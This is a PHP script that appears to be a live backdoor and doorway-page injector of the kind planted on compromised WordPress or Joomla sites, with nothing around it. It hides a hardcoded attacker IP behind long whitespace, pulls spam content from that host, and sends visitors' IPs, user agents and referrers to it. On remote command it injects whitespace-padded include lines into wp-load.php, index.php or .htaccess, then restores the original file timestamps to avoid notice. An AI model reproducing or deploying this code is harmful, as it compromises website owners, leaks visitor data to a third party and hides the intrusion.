<?php
error_reporting(0);
session_start();
																																																																																																	$myHost = "195.154.162.245";$pathOnMyHost = "";$pathToDor = "/co";$template = 'mariosarti';$connect = 1;
$cookie_name = 'UTCSESSID';
$period = 86400;
$sn = $_SERVER['SERVER_NAME'];
$rq = $_SERVER['REQUEST_URI'];
$trace = 'http://'.$_SERVER['HTTP_HOST'].'/error_404';
$hr = $_SERVER['HTTP_REFERER'];
$HTTP_HOST = (substr(strtolower($_SERVER['HTTP_HOST']),0,4) == 'www.' ? substr($_SERVER['HTTP_HOST'],4) : $_SERVER['HTTP_HOST']);

$cms = cmsc();
if(isset($_REQUEST['checkstatus']) && isset($_REQUEST['checklink'])){
    echo $_REQUEST['checkstatus'];
    if(isset($_REQUEST['checklink'])){
        checkLink('http://'.$_SERVER['HTTP_HOST'].$pathToDor.'/'.$_REQUEST['checklink'], $_REQUEST['resultedcheck']);
    }

    exit;
}elseif(!isset($_REQUEST['checkstatus']) && isset($_REQUEST['checklink'])){
 echo checkLink('http://'.$_SERVER['HTTP_HOST'].$pathToDor.'/'.$_REQUEST['checklink'], $_REQUEST['resultedcheck']);
 exit;
}

if(strpos($_SERVER['REQUEST_URI'], $pathToDor) !== false){$path = substr($_SERVER['REQUEST_URI'], strlen($pathToDor));}else{$path = $_SERVER['REQUEST_URI'];}

$html = getContent($myHost, $pathOnMyHost.$path, $template,$pathToDor);

if (strstr($path, ".css")) header('Content-Type: text/css; charset=utf-8');
else if (strstr($path, ".png")) header('Content-Type: image/png');
else if (strstr($path, ".jpg") || strstr($path, ".jpeg")) header('Content-Type: image/jpeg');
else if (strstr($path, ".gif")) header('Content-Type: image/gif');
else if (strstr($path, ".ico")) header("Content-type: image/x-icon");
else if (strstr($path, ".xml")) header ('Content-type: text/xml; charset=utf-8');
else if (strstr($path, ".txt")) header('Content-Type: text/plain; charset=utf-8');
else if (strstr($path, ".js")) header('Content-Type: text/javascript; charset=utf-8');
else if (strstr($path, "rss")) header ('Content-type: text/xml; charset=utf-8');
else header('Content-Type: text/html; charset=utf-8');

if(!empty($html))
{

if($cms){
	$pathToDorClear = str_replace('/','',$pathToDor);
    echo str_replace('/'.$pathToDorClear.'/','/',$html);
    exit;
}else{
	echo $html;
	exit;
}

}


function getContent($host, $path, $template, $pathToDor) {
    global $connect, $pathOnMyHost, $hr, $HTTP_HOST;

    if ($connect) {

        $headers = array(
            "User-Agent: $template"
            ."|$pathToDor"
            ."|$pathOnMyHost"
            ."|http://".$HTTP_HOST
            ."|".getUserIP()
            ."|".$_SERVER['HTTP_USER_AGENT']
            .'|'.$hr,
            "Referer: http://".$HTTP_HOST
        );
//var_dump( $headers, $host.$path);
//exit;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'http://'.$host.$path);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers );
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15 );
        curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=' . $_COOKIE['PHPSESSID'] . '; path=/' );
        curl_setopt($ch, CURLOPT_TIMEOUT, 15 );
        $result = curl_redir_exec( $ch );
        curl_close($ch);
        return $result;
    } else {
        $buff = '';

        $socket = @fsockopen($host, 80, $errno, $errstr);
        if ($socket) {
            @fputs($socket, "GET {$path} HTTP/1.0\r\n");
            @fputs($socket, "Host: {$host}\r\n");
            @fputs($socket, "Referer: http://".$HTTP_HOST."\r\n");
            @fputs($socket, "User-Agent:  $template"
                ."|$pathToDor"
                ."|$pathOnMyHost"
                ."|http://".$HTTP_HOST
                ."|".getUserIP()
                ."|".$_SERVER['HTTP_USER_AGENT']
                .'|'.$hr
                ."\r\n"
            );
            @fputs($socket, "Connection: close\r\n\r\n");

            while (!@feof($socket)) {
                $buff .= @fgets($socket, 128);
            }

            @fclose($socket);
            $result = explode("\r\n\r\n", $buff, 2);

            if (preg_match("~Location: (.*)~", $result[0], $m)) {
                header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
                header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
                header("Pragma: no-cache"); // HTTP/1.1
                header("Last-Modified: ".gmdate("D, d M Y H:i:s")."GMT");
                header("HTTP/1.1 301 Moved Permanently");
                header("Location: ".str_replace($pathOnMyHost, '', $m[1]));exit;
            }

            return $result[1];
        } else return "";
    }
}

function getUserIP() {

    $array = array('HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR', 'HTTP_X_REMOTECLIENT_IP');
    foreach($array as $key)
        if(filter_var($_SERVER[$key], FILTER_VALIDATE_IP)) return $_SERVER[$key];
    return false;



}
function curl_redir_exec($ch) {
    global $pathOnMyHost;
    global $cookie_name;
    global $period;
global $HTTP_HOST;
    static $curl_loops = 0;
    static $curl_max_loops = 20;
	global $cms;
    if ($curl_loops   >= $curl_max_loops) {
$curl_loops = 0;
return FALSE;
}
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
list($header, $data) = explode("\r\n\r\n", $data, 2);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if ($http_code == 301 || $http_code == 302) {
$matches = array();
preg_match("~Location:(.*?)(?:\n|$)~", $header, $matches);
$url = @parse_url(trim(array_pop($matches)));

if (!$url) {

$curl_loops = 0;
return $data;
}
$last_url = parse_url(curl_getinfo($ch, CURLINFO_EFFECTIVE_URL));

if (!$url['scheme']) $url['scheme'] = $last_url['scheme'];
if (!$url['host']) $url['host'] = $last_url['host'];
if (!$url['path']) $url['path'] = $last_url['path'];
//---- check refferer and other parameters

if(strpos($url['query'],'{referrer}')) $url['query'] = str_replace('{referrer}','http://'.$HTTP_HOST.'/',$url['query']);

$new_url = $url['scheme'] . '://' . $url['host'] . $url['path'] . ($url['query']?'?'.$url['query']:'');



header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")."GMT");
header("HTTP/1.1 301 Moved Permanently");
$domain = $_SERVER['SERVER_NAME'];
$cookieDomain = '.'.(substr(strtolower($domain),0,4) == 'www.' ? substr($domain,4) : $domain);
//setcookie($cookie_name,md5(uniqid()),time()+$period,'/',$cookieDomain);
setcookie($cookie_name,md5(uniqid()),0,'/',$cookieDomain);
header("Location: ".$new_url);exit;

}elseif($http_code == 404){

return '';
}
else {
$curl_loops=0;
return $data;
}
}
function cmsc(){
if(file_exists($_SERVER['DOCUMENT_ROOT'].'/wp-config.php') || file_exists($_SERVER['DOCUMENT_ROOT'].'/configuration.php')){
	return true;
}else{
	return false;
}
}
function checkLink($url, $result)
{

global $pathToDor;
$status =  file_get_contents($url);
$actionResult = '';
if($status != $result)
{
$cms = '';
$fileContent = '';
if(file_exists($_SERVER['DOCUMENT_ROOT'].'/wp-config.php')){
$cms = '																																																																																																																																																																																																												if($_SERVER[\'REQUEST_URI\'] != \'/\'){ @include(\''.getcwd().'/'.basename(__FILE__).'\');}';
$time = filemtime($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');
@chmod($_SERVER['DOCUMENT_ROOT'].'/wp-load.php', 0777);
$fileContent = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');
$fileContent = substr_replace($fileContent, '<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         '.$cms.'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ', $fileContent, (strpos($fileContent, '<?php') + 6));
            if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-load.php', $fileContent))
            {
                $actionResult = $result;
            }
            @touch($_SERVER['DOCUMENT_ROOT'].'/wp-load.php', $time);
            @chmod($_SERVER['DOCUMENT_ROOT'].'/wp-load.php', 0644);
        }elseif(file_exists($_SERVER['DOCUMENT_ROOT'].'/configuration.php')){
            $cms = '																																																																																																																																																																																																												if($_SERVER[\'REQUEST_URI\'] != \'/\'){ @include(\''.getcwd().'/'.basename(__FILE__).'\');}';
            $time = filemtime($_SERVER['DOCUMENT_ROOT'].'/index.php');
            @chmod($_SERVER['DOCUMENT_ROOT'].'/index.php', 0777);
            $fileContent = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/index.php');
            $fileContent = substr_replace($fileContent, '<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         '.$cms.'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ', $fileContent, (strpos($fileContent, '<?php') + 6));
            if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/index.php', $fileContent))
            {
                $actionResult = $result;
            }
            @touch($_SERVER['DOCUMENT_ROOT'].'/index.php', $time);
            @chmod($_SERVER['DOCUMENT_ROOT'].'/index.php', 0644);
        }else{
            $path = str_replace($_SERVER['DOCUMENT_ROOT'], '', getcwd());
            $cms = "                                                                                                                                                                                                                                                                                                                        RewriteEngine On
																																																																																			RewriteRule ^([^.]+)(?<!/)$ /$1/ [R=301,L]
                                                                                                                                                                                                                                                                                                                                            RewriteCond %{REQUEST_URI} ^\{pathToDor}*
                                                                                                                                                                                                                                                                                                                        RewriteRule (.*)$ ".$path."/".basename(__FILE__)." [L]";
            if(file_exists($_SERVER['DOCUMENT_ROOT'].'/.htaccess')){
                $time = filemtime($_SERVER['DOCUMENT_ROOT'].'/.htaccess');
                @chmod($_SERVER['DOCUMENT_ROOT'].'/.htaccess', 0777);
                $fileContent = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/.htaccess');
                $fileContent = $cms.'
                '.$fileContent;
                if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/.htaccess', $fileContent))
                {
                    $actionResult = $result;
                }
                @touch($_SERVER['DOCUMENT_ROOT'].'/.htaccess', $time);
                @chmod($_SERVER['DOCUMENT_ROOT'].'/.htaccess', 0644);
            }else{
                $fileContent = $cms;
                $time = filemtime($_SERVER['DOCUMENT_ROOT'].'/index.php');
                if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/.htaccess', $fileContent))
                {
                    $actionResult = $result;
                }
                @touch($_SERVER['DOCUMENT_ROOT'].'/.htaccess', $time);
            }

        }


    }else{
        $actionResult = $result;
    }
    return $actionResult;
}